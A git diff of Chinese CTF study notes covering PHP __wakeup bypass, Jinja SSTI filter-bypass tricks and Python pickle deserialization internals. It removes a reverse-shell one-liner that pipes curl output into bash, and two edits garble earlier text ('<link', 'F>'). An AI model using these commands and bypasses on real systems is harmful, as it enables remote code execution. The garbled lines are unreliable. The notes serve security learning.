@@ -500,6 +500,8 @@ $str = new f4ke();
 
 当序列化字符串中表示对象中属性个数的数字，大于真正的属性个数时，就会跳过 `__wakeup` 函数的执行（会触发两个长度相关的 `Notice: Unexpected end of serialized data`）。
 
+>我的猜测，PHP绕过`__wakeup()`是因为`__wakeup`在反序列化完成之后进行，包括正常的反序列化完成和反序列化报错，而当表示对象中属性个数的数字大于真正的属性个数时，就会导致反序列化是一个没有完成的状态，也就是直接将对象反序列化到一个不完整的状态。这将绕过 `__wakeup()` 函数的执行，因为 PHP 无法通过未知的属性来检查对象的完整性。
+
 demo.php
 
 ```php
@@ -3218,7 +3220,7 @@ base.html
 
 ```html
 <head>
-    {% block head %}
+    {% block head %}<link
     <title>{% block title %}{% endblock %} - World</title>
     {% endblock %}
 </head>
@@ -3514,7 +3516,7 @@ except Exception:
 4. 理论上有了 1 之后就可以搞出所有其他数字，可以用 `+` 或者是 `-`+`|abs`
 5. 空格：`{{ {}|center|last }}`、`{1:1}|xmlattr|first`
 6. `<`：`{}|select|string|first`
-7. `>`：`{}|select|string|last`
+7. `F>`：`{}|select|string|last`
 8. 点：`{{ self|float|string|min }}` 或者 `c.__lt__|string|truncate(3)|first`
 9. `a-z`：`{{ range.__doc__ + dict.__doc__}}`
 10. `A-Z`：`{{ (range.__doc__ + dict.__doc__) | upper }}`
@@ -3894,7 +3896,7 @@ Cookie方式，利用request.cookies传递参数
    利用dict绕过
 
    ```python
-   {{dict(__in=a,it__=a)|join}}  =__init_
+   {{dict(__in=a,it__=a)|join}}  =__init__
    ```
 
    例如 `whoami`：
@@ -3995,1049 +3997,1039 @@ Cookie方式，利用request.cookies传递参数
 
 从上面可以看出，这个姿势要实用，很依赖 `.`，如果这个被干掉了那就要换其他的姿势了
 
-## 反弹shell
-
-```
-curl 192.168.159.128:5478|bash
-```
-
 ## Python Flask框架相关
 
 ### session 信息泄露 & 伪造
 
 
 
-## Python中@的用法
+## Python 反序列化
 
-在Python中，`@`符号被用作修饰符的标志。修饰符用于修改函数、方法或类的行为，并且可以使代码更加简洁和易读。修饰符是Python的一个强大特性，可以在不修改原始函数或类的情况下，通过附加额外的功能来扩展其行为。
+>参考：[SecMap - 反序列化（Python） - Tr0y's Blog](https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/)
+>
+>[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/89132768)
+>
+>
 
-以下是`@`符号在Python中的常见用法：
+### Python反序列化的相关库和方法
 
-- 函数修饰符：将修饰符应用于函数，用于增加或修改函数的功能。
+在 Python 中内置了标准库 `pickle`/`cPickle`（3.x 改名为 `_pickle`），用于序列化/反序列化的各种操作（Python 的官方文档中，称其为 封存/解封，意思其实差不多），比较常见的当然是 `dumps`（序列化）和 `loads`（反序列化）啦。其中 `pickle` 是用 Python 写的，`cPickle` 是用 C 语言写的，速度很快，但是它不允许用户从 `pickle` 派生子类。
 
-```python
-def my_decorator(func):
-    def wrapper():
-        print("Something is happening before the function is called.")
-        func()
-        print("Something is happening after the function is called.")
-    return wrapper
+![image-20230924213758854](daydayup.assets/image-20230924213758854.png)
 
-@my_decorator
-def say_hello():
-    print("Hello!")
+另外有一点需要注意：对于我们自己定义的class，如果直接以形如`test = 1`的方式赋初值，**则这个`test`不会被打包！**解决方案是写一个`__init__`方法， 也就是这样：
 
-say_hello()
+![image-20230924194235905](daydayup.assets/image-20230924194235905.png)
+
+###  PVM
+
+要对序列化、反序列化很清楚的话，一定要了解 PVM，这背后又有非常多的细节。
+
+首先，在调用 pickle 的时候，实际上是 `class pickle.Pickler` 和 `class pickle.Unpickler` 在起作用，而这两个类又是依靠 Pickle Virtual Machine(PVM)，在更深层对输入进行着某种操作，从而最后得到了那串复杂的结果。
+
+PVM 由三部分组成：
+
+1. 指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到`.`这个结束符后停止（看上面的代码示例，序列化之后的结果最后是`.`）。最终留在栈顶的值将被作为反序列化对象返回。需要注意的是：
+   1. opcode 是单字节的
+   2. 带参数的指令用换行符（`\n`）来确定边界
+2. 栈区(stack)：用 list 实现的，被用来临时存储数据、参数以及对象。
+3. 内存区(memo)：用 dict 实现的，为 PVM 的整个生命周期提供存储。
+
+![image-20230924195131072](daydayup.assets/image-20230924195131072.png)
+
+![image-20230924195149851](daydayup.assets/image-20230924195149851.png)
+
+最后，PVM 还有协议一说，这里的协议指定了应该采用什么样的序列化、反序列化算法。
+
+#### PVM 协议
+
+当前共有 6 种不同的协议可用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新。
+
+1. v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python
+2. v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容
+3. v2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）。
+4. v3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。
+5. v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议。
+6. v5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）
+
+### opcode
+
+```
+MARK           = b'('   # 向栈中压入一个 MARK 标记
+STOP           = b'.'   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值
+POP            = b'0'   # 丢弃栈顶对象
+POP_MARK       = b'1'   # discard stack top through topmost markobject
+DUP            = b'2'   # duplicate top stack item
+FLOAT          = b'F'   # 实例化一个 float 对象
+INT            = b'I'   # 实例化一个 int 或者 bool 对象
+BININT         = b'J'   # push four-byte signed int
+BININT1        = b'K'   # push 1-byte unsigned int
+LONG           = b'L'   # push long; decimal string argument
+BININT2        = b'M'   # push 2-byte unsigned int
+NONE           = b'N'   # 栈中压入 None
+PERSID         = b'P'   # push persistent object; id is taken from string arg
+BINPERSID      = b'Q'   # push persistent object; id is taken from stack
+REDUCE         = b'R'   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈
+STRING         = b'S'   # 实例化一个字符串对象
+BINSTRING      = b'T'   # push string; counted binary string argument
+SHORT_BINSTRING= b'U'   # push string; counted binary string argument < 256 bytes
+UNICODE        = b'V'   # 实例化一个 UNICODE 字符串对象
+BINUNICODE     = b'X'   # push Unicode string; counted UTF-8 string argument
+APPEND         = b'a'   # 将栈的第一个元素 append 到第二个元素（必须为列表）中
+BUILD          = b'b'   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()
+GLOBAL         = b'c'   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈
+DICT           = b'd'   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果
+EMPTY_DICT     = b'}'   # 向栈中直接压入一个空字典
+APPENDS        = b'e'   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中
+GET            = b'g'   # 将 memo[n] 的压入栈
+BINGET         = b'h'   # push item from memo on stack; index is 1-byte arg
+INST           = b'i'   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
+LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
+LIST           = b'l'   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表
+EMPTY_LIST     = b']'   # 向栈中直接压入一个空列表
+OBJ            = b'o'   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，
+PUT            = b'p'   # 将栈顶对象储存至 memo[n]
+BINPUT         = b'q'   # store stack top in memo; index is 1-byte arg
+LONG_BINPUT    = b'r'   # store stack top in memo; index is 4-byte arg
+SETITEM        = b's'   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中
+TUPLE          = b't'   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果
+EMPTY_TUPLE    = b')'   # 向栈中直接压入一个空元组
+SETITEMS       = b'u'   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中
+BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding
+
+TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
+FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py
 ```
 
+>```
+>ai翻译
+>
+>MARK = b'('           # 在堆栈上推送特殊的标记对象
+>STOP = b'.'           # 每个 pickle 序列化结束时都以 STOP 结尾
+>POP = b'0'            # 弹出堆栈顶部的元素
+>POP_MARK = b'1'       # 弹出堆栈顶部直到最上面的标记对象
+>DUP = b'2'            # 复制堆栈顶部的元素
+>FLOAT = b'F'          # 推送浮点数对象；十进制字符串参数
+>INT = b'I'            # 推送整数或布尔值；十进制字符串参数
+>BININT = b'J'         # 推送四字节有符号整数
+>BININT1 = b'K'        # 推送一字节无符号整数
+>LONG = b'L'           # 推送长整数；十进制字符串参数
+>BININT2 = b'M'        # 推送两字节无符号整数
+>NONE = b'N'           # 推送 None
+>PERSID = b'P'         # 推送持久化对象；id 从字符串参数中获取
+>BINPERSID = b'Q'      # 推送持久化对象；id 从堆栈中获取
+>REDUCE = b'R'         # 对堆栈上的 argtuple 应用 callable 函数
+>STRING = b'S'         # 推送字符串；以 NL 结尾的字符串参数
+>BINSTRING = b'T'      # 推送字符串；计数的二进制字符串参数
+>SHORT_BINSTRING = b'U' # 推送字符串；长度小于 256 字节的字符串参数
+>UNICODE = b'V'        # 推送 Unicode 字符串；以 raw-unicode-escaped 方式转义的字符串参数
+>BINUNICODE = b'X'     # 推送字符串；计数的 UTF-8 字符串参数
+>APPEND = b'a'         # 将堆栈顶部的元素添加到下面的列表中
+>BUILD = b'b'          # 调用 __setstate__ 或 __dict__.update()
+>GLOBAL = b'c'         # 推送 self.find_class(modname, name)；两个字符串参数
+>DICT = b'd'           # 从堆栈项构建字典
+>EMPTY_DICT = b'}'     # 推送空字典
+>APPENDS = b'e'        # 将堆栈上最上面的切片扩展到下面的列表中
+>GET = b'g'            # 从 memo 中推送堆栈上的项；索引为字符串参数
+>BINGET = b'h'         # 从 memo 中推送堆栈上的项；索引为一字节参数
+>INST = b'i'           # 构建并推送类实例
+>LONG_BINGET = b'j'    # 从 memo 中推送堆栈上的项；索引为四字节参数
+>LIST = b'l'           # 从堆栈上的顶部项构建列表
+>EMPTY_LIST = b']'     # 推送空列表
+>OBJ = b'o'            # 构建并推送类实例
+>PUT = b'p'            # 将堆栈顶部的元素存储在 memo 中；索引为字符串参数
+>BINPUT = b'q'         # 将堆栈顶部的元素存储在 memo 中；索引为一字节参数
+>LONG_BINPUT = b'r'    # 将堆栈顶部的元素存储在 memo 中；索引为四字节参数
+>SETITEM = b's'        # 将键值对添加到字典中
+>TUPLE = b't'          # 从堆栈上的顶部项构建元组
+>EMPTY_TUPLE = b')'    # 推送空元组
+>SETITEMS = b'u'       # 通过添加堆栈上最上面的键值对修改字典
+>BINFLOAT = b'G'       # 推送浮点数；参数为 8 字节浮点数编码
+>
+>TRUE = b'I01\n'       # 不是一个操作码；参见 pickletools.py 中的 INT 文档
+>FALSE = b'I00\n'      # 不是一个操作码；参见 pickletools.py 中的 INT 文档
+>
+># Protocol 2
+>PROTO = b'\x80'       # 标识 pickle 协议
+>NEWOBJ = b'\x81'      # 通过将 cls.__new__ 应用于 argtuple 构建对象
+>EXT1 = b'\x82'        # 从扩展注册表中推送对象；一字节索引
+>EXT2 = b'\x83'        # 同上，但是两字节索引
+>EXT4 = b'\x84'        # 同上，但是四字节索引
+>TUPLE1 = b'\x85'      # 从堆栈顶部构建 1 元组
+>TUPLE2 = b'\x86'      # 从两个最上面的堆栈项构建 2 元组
+>TUPLE3 = b'\x87'      # 从三个最上面的堆栈项构建 3 元组
+>NEWTRUE = b'\x88'     # 推送 True
+>NEWFALSE = b'\x89'    # 推送 False
+>LONG1 = b'\x8a'       # 从 < 256 字节的字符串推送长整数
+>LONG4 = b'\x8b'       # 推送非常大的长整数
+>
+>_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]
+>
+># Protocol 3 (Python 3.x)
+>BINBYTES = b'B'       # 推送字节；计数的二进制字符串参数
+>SHORT_BINBYTES = b'C' # 推送字节；长度小于 256 字节的字符串参数
+>
+># Protocol 4
+>SHORT_BINUNICODE = b'\x8c'  # 推送短字符串；UTF-8 长度小于 256 字节
+>BINUNICODE8 = b'\x8d'       # 推送非常长的字符串
+>BINBYTES8 = b'\x8e'         # 推送非常长的字节字符串
+>EMPTY_SET = b'\x8f'         # 在堆栈上推送空集合
+>ADDITEMS = b'\x90'          # 通过添加堆栈上最上面的项修改集合
+>FROZENSET = b'\x91'         # 从堆栈上的最上面的项构建 frozenset
+>NEWOBJ_EX = b'\x92'         # 类似于 NEWOBJ，但与仅关键字参数一起使用
+>STACK_GLOBAL = b'\x93'      # 类似于 GLOBAL，但使用堆栈上的名称
+>MEMOIZE = b'\x94'           # 将堆栈顶部的元素存储在 memo 中
+>FRAME = b'\x95'             # 表示新帧的开始
+>
+># Protocol 5
+>BYTEARRAY8 = b'\x96'        # 推送 bytearray
+>NEXT_BUFFER = b'\x97'       # 推送下一个带外缓冲区
+>READONLY_BUFFER = b'\x98'   # 将堆栈顶部设为只读
+>
+>```
 
+### Python反序列化的过程
 
-- 类方法修饰符：将修饰符应用于类的方法，用于定义静态方法、类方法或属性。
+反序列化中主要的是栈，栈有两个部分很重要，一个是`stack`，一个是`metastack`。栈最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：`stack`专注于维护**最顶层的信息**，而`metastack`维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。
 
-```python
-class MyClass:
-    @staticmethod
-    def static_method():
-        print("This is a static method.")
+还有一部分是存储区（`memo`），存储区可以类比内存，用于存取变量。它是一个数组，用来存储序列化过程中已经遇到的对象及其对应的序列化数据，数组的索引（下标）对应对象的 ID。它的每一个单元可以用来存储任何东西，但是说句老实话，大多数情况下我们并不需要这个存储区。
 
-    @classmethod
-    def class_method(cls):
-        print("This is a class method.")
+![image-20230924214334571](daydayup.assets/image-20230924214334571.png)
 
-    @property
-    def my_property(self):
-        return "This is a property."
+>在 Python 的 `pickle` 序列化和反序列化过程中，`memo` 存储区用于避免循环引用和重复序列化对象。
+>
+>具体作用如下：
+>
+>1. **避免循环引用**:
+>   - Python 对象之间可能存在循环引用，即对象 A 引用了对象 B，而对象 B 又引用了对象 A。在序列化时，如果不加控制，会陷入无限递归。`memo` 存储区记录已经序列化的对象的 ID，从而避免无限递归。
+>2. **避免重复序列化**:
+>   - 在 pickle 中，对象可能会在多个地方被引用，如果在序列化过程中重复序列化这些对象，会浪费空间和时间。`memo` 存储区可以避免这种情况，因为它会记录已经序列化的对象，当再次遇到相同对象时，直接引用其序列化后的位置，而不是重复序列化。
 
-MyClass.static_method()
-MyClass.class_method()
+>### _loads
+>
+>pickle内反序列化的源码中，有几个比较关键的方法`readline()`、`pop_mark()`、`pop()`
+>
+>![image-20231018210055979](daydayup.assets/image-20231018210055979.png)
+>
+>![image-20231018210333448](daydayup.assets/image-20231018210333448.png)
+>
+>- `readline()`的作用是读取仍未入栈的一行数据，是`opcode`后面的数据
+>  ![image-20231018211028100](daydayup.assets/image-20231018211028100.png)
+>- `pop_mark()`的作用是弹出`MARK`栈，将放在前序栈（`metastack`）中的栈（`stack`）数据放回栈中
+>  ![image-20231018211315803](daydayup.assets/image-20231018211315803.png)
+>- `stack.pop()`的作用是弹出栈中的第一个数据
+>
+>剩下的一些方法都能够看函数名得知作用，这三个的操作流程影响手写`opcode`，所以拿出来单说
 
-my_instance = MyClass()
-print(my_instance.my_property)
+分析一下上面的代码
+
+![image-20230924213916991](daydayup.assets/image-20230924213916991.png)
+
+```
+b'\x80\x03c__main__\ntest\nq\x00)\x81q\x01}q\x02X\x04\x00\x00\x00testq\x03K\x01sb.'
+    0: \x80 PROTO      3
+    2: c    GLOBAL     '__main__ test'
+   17: )    EMPTY_TUPLE
+   18: \x81 NEWOBJ
+   19: }    EMPTY_DICT
+   20: X    BINUNICODE 'test'
+   29: K    BININT1    1
+   31: s    SETITEM
+   32: b    BUILD
+   33: .    STOP
+highest protocol among opcodes = 2
 ```
 
+首先`\x80`制定协议版本为`3`，然后`c`导入`__main__`中的`test`模块，然后`）`向栈中直接压入一个空元组![img](daydayup.assets/0169dce8fd5162b87e28e7f0cee4117b.png)
 
+然后`\x81`弹出栈顶的两个元素，第一个弹出的元素作为参数，第二个弹出的元素作为类，然后对该类进行初始化，再给初始化后的类压入栈中![image-20230924214520196](daydayup.assets/image-20230924214520196.png)
 
-- 类修饰符：将修饰符应用于类，用于修改类的行为或特性。类修饰符可以在类定义之前使用，作用于整个类。当定义类时，修饰符函数会在类创建时被调用，且只调用一次。
+>```python
+>class CapStr(str):
+>    def __new__(cls, *args):
+>        self_in_init = super().__new__(cls, *args)
+>        print("__new__ id -> " + str(id(self_in_init)))
+>        print("__new__ args -> " + str(args))
+>        return self_in_init
+>
+>    def __init__(self, string):
+>        print("__init__ string -> " + string)
+>        print("__init__ id -> " + str(id(self)))
+>
+>
+>a = CapStr("I love China!")
+>print("a id -> " + str(id(a)))
+>
+>```
+>
+>__new__ id -> 1799333919200
+>__new__ args -> ('I love China!',)
+>__init__ string -> I love China!
+>__init__ id -> 1799333919200
+>a id -> 1799333919200
+
+这样之后栈顶的元素就为实例化的类`test`，`}`向栈中压入一个空的字典，`X`将 Unicode 字符串`test`编码成 UTF-8 字节流并压入栈中
+![image-20231005202632907](daydayup.assets/image-20231005202632907.png)
+
+`K`向栈中压入一个一字节无符号整数，在这里也就是`1`
+![image-20231005203433609](daydayup.assets/image-20231005203433609.png)
+
+>`unpack` 函数是 Python 中 `struct` 模块提供的一个用于解析字节流的函数。`struct` 模块允许你将 Python 数据类型转换为字节流（称为"pack"）和将字节流解析为 Python 数据类型（称为"unpack"）。
+>
+>函数签名：
+>
+>```python
+>struct.unpack(format, buffer)
+>```
+>
+>- `format` 参数指定了字节流的格式，以及如何解析这个字节流。它是一个字符串，其中包含了格式化指令，用于指定字节流中数据的类型、大小和顺序。
+>- `buffer` 参数是要解析的字节流，通常是一个 bytes 对象。
+>
+>`unpack` 函数根据指定的格式字符串解析字节流，并返回一个元组，包含解析得到的数据。格式字符串中的格式化指令告诉 `unpack` 如何解析字节流，并将解析得到的数据以元组的形式返回。
+>
+>例如，如果你有一个 4 字节的字节流，表示一个无符号整数（采用小端字节序），可以使用以下方式解析：
+>
+>```python
+>import struct
+>
+>data = b'\x01\x00\x00\x00'  # 4-byte little-endian representation of the number 1
+>unpacked_data = struct.unpack('<I', data)  # Unpack as an unsigned integer in little-endian format
+>print(unpacked_data)  # Output: (1,)
+>```
+>
+>在这个示例中，`format` 参数为 `<I`，表示小端字节序（`<`）的无符号整数（`I`）。`unpack` 函数解析字节流 `data`，将其解释为一个小端字节序的无符号整数，返回的元组中包含解析得到的数值。
+>
+>>小端字节序（Little Endian）是一种字节序排列方式，其中数值的低位字节存储在内存的低地址处，高位字节存储在内存的高地址处。这意味着数值的最低有效字节（最右边的字节）会存储在内存中的最低地址，而最高有效字节（最左边的字节）会存储在内存中的高地址。
+>>
+>>举个简单的例子，假设我们有一个 32 位整数 0x12345678（十六进制表示），在小端字节序下，它在内存中的存储方式如下：
+>>
+>>```
+>>Address:  0x1000   0x1001   0x1002   0x1003
+>>Data:     0x78     0x56     0x34     0x12
+>>```
+>>
+>>- 地址 0x1000 存储了最低有效字节（0x78），地址递增代表字节的位置递增。
+>>- 地址 0x1003 存储了最高有效字节（0x12），即整数的最高位。
+>>
+>>在小端字节序下，读取多字节数据时，我们先读取最低有效字节，再依次读取高位字节，即从低地址向高地址读取。
+>>
+>>小端字节序在许多计算机体系结构中被广泛采用，包括 x86 和 x86-64 架构等。
+
+`s`弹出栈顶两个元素，第一个作为value，第二个作为key，添加或更新到弹出上述两个元素之后的栈顶元素中（必须为列表或字典）
+![image-20231005203832120](daydayup.assets/image-20231005203832120.png)
+
+`b`将弹出栈顶元素，然后利用该元素对弹出上述元素后的栈顶元素进行属性设置，利用`__setstate__()`(如果它存在的话就用它，不存在就用下面的)或者`__dict__`，这边就是将属性`test=1`赋给实例`test`，最后`.`结束。
+![image-20231005205154634](daydayup.assets/image-20231005205154634.png)
+
+>### `__setstate__()` 
+>
+>`__setstate__()` 是 Python 中用于自定义反序列化过程的特殊方法。它允许在反序列化对象时对对象进行额外的处理和初始化。
+>
+>当使用 Pickle 模块反序列化对象时，如果对象实现了 `__setstate__()` 方法，Pickle 将在反序列化后调用该方法，将反序列化的状态信息传递给对象，以便自定义对象的恢复过程。
+>
+>方法签名如下：
+>```python
+>def __setstate__(self, state):
+>    # Custom deserialization logic
+>    pass
+>```
+>
+>- `self`：对象实例。
+>- `state`：包含了反序列化的状态信息的字典或其他数据结构。
+>
+>开发者可以在 `__setstate__()` 方法中根据自己的需求解析传递进来的状态信息，并据此初始化对象的属性。这允许进行一些定制的初始化操作，以确保对象在反序列化后的状态是正确的。
+>
+>举个简单的例子：
+>
+>```python
+>import pickle
+>
+>class CustomObject:
+>    def __init__(self):
+>        self.value = 0
+>
+>    def __setstate__(self, state):
+>        self.value = state.get('value', 0)
+>
+>    def __repr__(self):
+>        return f'CustomObject(value={self.value})'
+>
+># Serialize an instance of CustomObject
+>original_object = CustomObject()
+>original_object.value = 42
+>serialized_object = pickle.dumps(original_object)
+>
+># Deserialize the object and invoke __setstate__()
+>deserialized_object = pickle.loads(serialized_object)
+>print(deserialized_object)  # Output: CustomObject(value=42)
+>```
+>
+>在上面的例子中，`CustomObject` 实现了 `__setstate__()` 方法，用于在反序列化时根据传递的状态信息更新对象的属性。
+>
+>### `sys.intern()` 
+>
+>`sys.intern()` 是 Python 的内置函数，用于在 Python 字符串池中查找字符串。字符串池是一个特殊的数据结构，它保存了 Python 中所有字符串对象的唯一实例，以避免重复创建相同的字符串。
+>
+>具体地说，`sys.intern()` 函数接受一个字符串作为参数，它会将该字符串放入字符串池中并返回一个对该字符串的引用。如果字符串已存在于字符串池中，则返回现有的引用。这样可以确保相同内容的字符串在内存中只存在一份，从而节省内存并提高字符串比较的效率。
+>
+>举个例子：
+>
+>```python
+>import sys
+>
+>s1 = 'hello'
+>s2 = 'hello'
+>
+># Check if s1 and s2 point to the same object
+>print(s1 is s2)  # Output: True
+>
+># Use sys.intern to force the strings to point to the same object in the pool
+>s1 = sys.intern('hello')
+>s2 = sys.intern('hello')
+>
+># Check if s1 and s2 point to the same object after interning
+>print(s1 is s2)  # Output: True
+>```
+>
+>在这个例子中，`sys.intern('hello')` 将字符串 'hello' 放入字符串池，并返回该字符串的引用。在后续的对同样内容的字符串进行 intern 操作后，它们都会指向字符串池中的同一个对象。
+>
+>这个函数通常在处理大量字符串时，特别是需要比较字符串的场景下，能够提高程序的性能。
+>
+>### slotstate
+>
+>在提供的代码中，`slotstate` 变量用于存储反序列化过程中可能的“slot state”，并在适当的情况下应用到对象实例中。
+>
+>“slot state” 是指对象的状态信息，通常用于描述那些无法直接通过 `__dict__` 存储的状态，例如特殊的槽位（slots）。Python 中，槽位是一种在类定义中用于存储属性的机制，与常规的 `__dict__` 不同。
+>
+>在反序列化对象时，有时候对象的状态信息可能不仅仅通过 `__dict__` 存储，可能还依赖于类定义中的槽位（slots）等其他机制。`slotstate` 用于存储这些额外的状态信息，以确保对象在反序列化后完全恢复到正确的状态。
+>
+>具体来说，这段代码的逻辑如下：
+>
+>1. 首先，尝试从状态信息中解析出 `slotstate`（如果存在）。
+>2. 然后，如果有 `state`，将 `state` 的内容应用到对象的 `__dict__` 中。
+>3. 最后，如果有 `slotstate`，将 `slotstate` 中的内容通过 `setattr()` 函数应用到对象实例中。
+>
+>这样，可以确保对象的状态信息完整地被恢复，无论是通过普通属性 (`__dict__`) 还是特殊的槽位（slots）存储。
+
+### 相关魔术方法
+
+#### `__reduce__()`
+
+opcode中的`R`就是`__reduce__()`，他干了这件事
+
+- 取当前栈的栈顶记为`args`，然后把它弹掉。
+- 取当前栈的栈顶记为`f`，然后把它弹掉。
+- 以`args`为参数，执行函数`f`，把结果压进当前栈。
+
+class的`__reduce__`方法，在pickle反序列化的时候会被执行。其底层的编码方法，就是利用了`R`指令码。 `f`要么返回字符串，要么返回一个tuple，后者对我们而言更有用（返回的对象通常称为 “reduce 值”）。
+
+如果返回字符串，该字符串会被当做一个全局变量的名称。它应该是对象相对于其模块的本地名称，pickle 模块会搜索模块命名空间来确定对象所属的模块。这种行为常在单例模式使用。**（复现不出来）**
+
+如果返回的是元组，则应当包含 2 到 6 个元素，可选元素可以省略或设置为 None。每个元素代表的意义如下：
+
+1. 一个可调用对象，该对象会在创建对象的最初版本时调用。
+2. 可调用对象的参数，是一个元组。如果可调用对象不接受参数，必须提供一个空元组。
+3. 可选元素，用于表示对象的状态，将被传给前述的 `__setstate__()` 方法。如果对象没有此方法，则这个元素必须是字典类型，并会被添加至 `__dict__` 属性中。
+4. 可选元素，一个返回连续项的迭代器（而不是序列）。这些项会被 `obj.append(item)` 逐个加入对象，或被 `obj.extend(list_of_items)` 批量加入对象。这个元素主要用于 list 的子类，也可以用于那些正确实现了 `append()` 和 `extend()` 方法的类。（具体是使用 `append()` 还是 `extend()` 取决于 pickle 协议版本以及待插入元素的项数，所以这两个方法必须同时被类支持）
+5. 可选元素，一个返回连续键值对的迭代器（而不是序列）。这些键值对将会以 `obj[key] = value` 的方式存储于对象中。该元素主要用于 dict 子类，也可以用于那些实现了 `__setitem__()` 的类。
+6. 可选元素，一个带有 `(obj, state)` 签名的可调用对象。该可调用对象允许用户以编程方式控制特定对象的状态更新行为，而不是使用 obj 的静态 `__setstate__()` 方法。如果此处不是 None，则此可调用对象的优先级高于 obj 的 `__setstate__()`。
+
+可以看出，其实 pickle 并不直接调用上面的几个函数。事实上，它们实现了 `__reduce__()` 这一特殊方法。尽管这个方法功能很强，但是直接在类中实现 `__reduce__()` 容易产生错误。因此，设计类时应当尽可能的使用高级接口（比如 `__getnewargs_ex__()`、`__getstate__()` 和 `__setstate__()`）。后面仍然可以看到直接实现 `__reduce__()` 接口的状况，可能别无他法，可能为了获得更好的性能，或者两者皆有之。
+
+>##### `__reduce_ex__()`
+>
+>作为替代选项，也可以实现 `__reduce_ex__()` 方法。此方法的唯一不同之处在于它接受一个整型参数用于指定协议版本。如果定义了这个函数，则会覆盖 `__reduce__()` 的行为。此外，`__reduce__()` 方法会自动成为扩展版方法的同义词。这个函数主要用于为以前的 Python 版本提供向后兼容的 reduce 值。
+
+#### `__setstate__()` 
+
+`__setstate__()` 是 Python 中用于自定义反序列化过程的特殊方法。它允许在反序列化对象时对对象进行额外的处理和初始化。
+
+当使用 Pickle 模块反序列化对象时，如果对象实现了 `__setstate__()` 方法，Pickle 将在反序列化后调用该方法，将反序列化的状态信息传递给对象，以便自定义对象的恢复过程。
+
+方法签名如下：
 
 ```python
-def add_method_to_class(cls):
-    print("add_method_to_class")
-    def hello(self):
-        print("Hello from the class method!")
-    cls.say_hello = hello
-    return cls
-
-@add_method_to_class
-class MyClass:
+def __setstate__(self, state):
+    # Custom deserialization logic
     pass
+```
 
-my_instance = MyClass()
-my_instance.say_hello()
-"""
+- `self`：对象实例。
+- `state`：包含了反序列化的状态信息的字典或其他数据结构。
+
+开发者可以在 `__setstate__()` 方法中根据自己的需求解析传递进来的状态信息，并据此初始化对象的属性。这允许进行一些定制的初始化操作，以确保对象在反序列化后的状态是正确的。
+
+举个简单的例子：
+
+```python
+import pickle
+
+class CustomObject:
+    def __init__(self):
+        self.value = 0
+
+    def __setstate__(self, state):
+        self.value = state.get('value', 0)
+
+    def __repr__(self):
+        return f'CustomObject(value={self.value})'
+
+# Serialize an instance of CustomObject
+original_object = CustomObject()
+original_object.value = 42
+serialized_object = pickle.dumps(original_object)
+
+# Deserialize the object and invoke __setstate__()
+deserialized_object = pickle.loads(serialized_object)
+print(deserialized_object)  # Output: CustomObject(value=42)
+```
+
+在上面的例子中，`CustomObject` 实现了 `__setstate__()` 方法，用于在反序列化时根据传递的状态信息更新对象的属性。
+
+#### `__getstate__()`
+
+类还可以进一步控制实例的封存过程。如果类定义了 `__getstate__()`，它就会被调用，其返回的对象是被当做实例内容来封存的，否则封存的是实例的 `__dict__`。如果 `__getstate__()` 未定义，实例的 `__dict__` 会被照常封存
+
+`__getstate__()` 是一个特殊方法，用于自定义对象的序列化过程。当你使用 Python 的 `pickle` 模块或其他序列化工具来将对象转换为字节流时，`__getstate__()` 方法会被调用。
+
+在默认情况下，`pickle` 会尝试序列化对象的所有属性。但是，有时你可能希望控制哪些属性被序列化，或者在序列化过程中进行一些额外的处理。
+
+通过在你的对象中实现 `__getstate__()` 方法，你可以自定义对象的序列化行为。`__getstate__()` 方法应该返回一个字典，其中包含你希望序列化的属性和对应的值。只有在返回的字典中的属性才会被序列化。
+
+下面是一个示例，展示了如何使用 `__getstate__()` 方法来控制对象的序列化过程：
+
+```python
+import pickle
+
+class Point:
+    def __init__(self, x, y):
+        self.x = x
+        self.y = y
+
